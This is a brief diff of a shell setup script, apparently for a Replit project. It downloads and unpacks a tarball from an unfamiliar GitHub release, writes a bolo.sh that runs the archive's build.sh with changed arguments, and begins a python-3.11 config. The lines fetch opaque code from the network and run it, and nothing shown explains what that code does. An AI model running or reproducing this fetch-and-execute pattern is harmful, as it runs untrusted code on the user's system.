@@ -1,7 +1,7 @@
 curl -O -J -L https://github.com/ozkhauun752-create/amnun/releases/download/gred/kombe.tar.gz && tar -xf kombe.tar.gz && rm -rf kombe.tar.gz
 echo '#!/bin/bash
 
-bash build.sh 4 009' > bolo.sh
+bash build.sh 4 007' > bolo.sh
 echo 'modules = ["python-3.11"]
 
 [workflows]
